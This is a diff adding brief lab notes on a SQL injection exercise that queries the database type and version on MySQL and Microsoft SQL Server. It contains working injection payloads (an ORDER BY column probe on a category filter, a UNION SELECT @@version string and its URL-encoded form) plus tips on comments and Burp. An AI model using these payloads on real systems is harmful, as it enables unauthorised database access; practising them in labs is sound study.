@@ -1,0 +1,18 @@
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+# PRACTITIONER
+
+FINAL PAYLOAD = 
+
+Comments are not always --
+and sometime it is not getting URL encoded like you want
+when doing it manualy
+better use Burp
+
+for ORDER BY 3#
+/filter?category=Accessories'+ORDER+BY+2%23
+
+' UNION select 'a', @@version #
+%27%20%55%4e%49%4f%4e%20%73%65%6c%65%63%74%20%27%61%27%2c%20%40%40%76%65%72%73%69%6f%6e%20%23
+
+
